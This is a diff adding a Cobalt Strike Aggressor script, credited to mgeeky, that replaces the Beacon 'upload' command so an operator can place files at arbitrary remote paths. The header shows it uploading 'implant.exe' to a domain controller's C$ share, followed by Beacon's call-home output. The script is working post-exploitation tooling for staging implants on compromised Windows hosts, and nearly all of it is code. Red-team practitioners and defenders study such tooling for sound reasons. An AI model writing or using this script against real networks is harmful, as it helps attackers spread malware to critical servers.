@@ -1,0 +1,89 @@
+#
+# Handy alternative for built-in 'upload' command: lets you upload file to the specified
+# remote location. By default, the built-in upload command puts uploaded file to the CWD.
+# This script lets us override that behavior.
+#
+# -------------------------------------------
+# beacon> upload implant.exe \\DC1\c$\windows\temp\implant.exe
+# [*] Tasked Beacon to upload file (size: 929.25KB) from: (implant.exe) to: (\\DC1\c$\windows\temp\implant.exe)
+# [+] host called home, sent: 951655 bytes
+#
+# -------------------------------------------
+#
+# Author:
+#   Mariusz B. / mgeeky, '20
+#   <mb [at] binary-offensive.com>
+#   (https://github.com/mgeeky)
+#
+#
+
+beacon_command_register(
+    "upload",
+    "Upload a file to specified remote location.",
+    "Use: upload </local/path/to/file> [/remote/path/to/file]\n\nUpload a file from local path (first argument) to remote path (second argument, optional).");
+
+sub interpretSize {
+    local('$s $size');
+    $s = $1;
+
+    if($s == 0) { 
+        $size = ""; 
+    }
+    else if($s < 1024) { 
+        $size .= $s . "B"; 
+    }
+    else if($s < 1024 * 1024) { 
+        $size = round($s / 1024.0, 2);
+        $size .= "KB";
+    }
+    else if($s < 1024 * 1024 * 1024) { 
+        $size = round(($s / 1024.0) / 1024, 2); 
+        $size .= "MB";
+    }
+    else if($s < 1024 * 1024 * 1024 * 1024) { 
+        $size = round((($s / 1024.0) / 1024) / 1024, 2); 
+        $size .= "GB";
+    }
+
+    return $size;
+}
+
+alias upload {
+    local('$bid $f $localpath $remotepath $content');
+    ($bid, $localpath, $remotepath) = @_;
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        prompt_file_open("Choose a file", $null, $false, lambda({
+            $localpath = $1;
+        }, $localpath => $localpath));
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        berror($1, "Source file path (local path) must be specified.");
+        return;
+    }
+
+    if($remotepath is $null || strlen($remotepath) == 0) {
+        #$remotepath = getFileName($localpath);
+
+        bupload($1, $localpath);
+        return;
+    }
+
+    try {
+        $f = openf($localpath);
+        $content = readb($f, -1);
+        if($content is $null) {
+            throw "Read empty file";
+        }
+        closef($f);
+    }
+    catch $message { 
+        berror($1, "Could not read contents of file to upload. Error: $message");
+        return;
+    }
+
+    btask($1, "Tasked Beacon to upload file (size: " . interpretSize(strlen($content)) . ") from: ( $+ $localpath $+ ) to: ( $+ $remotepath $+ )");
+
+    bupload_raw!($1, $remotepath, $content, $localpath);
+}
